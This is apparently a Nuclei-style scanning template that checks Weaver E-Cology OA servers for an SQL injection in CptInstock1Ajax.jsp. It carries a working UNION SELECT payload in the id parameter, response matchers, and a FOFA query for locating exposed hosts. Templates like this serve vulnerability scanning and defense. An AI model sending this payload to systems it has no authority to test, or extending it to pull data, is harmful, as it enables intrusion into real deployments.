id: poc-yaml-weaver-e-cology-cptinstock1ajax-sqli
info:
  name: 泛微OA E-Cology CptInstock1Ajax SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: e-cology
    fofa: app="泛微-OA（e-cology）"

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/cpt/capital/CptInstock1Ajax.jsp?id=-99+UNION+ALL+SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')),1#"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "\"spec\":"
          - "\"price\":"
          - "{{t2}}"
      - type: word
        part: body
        words:
          - "<"
        negative: true
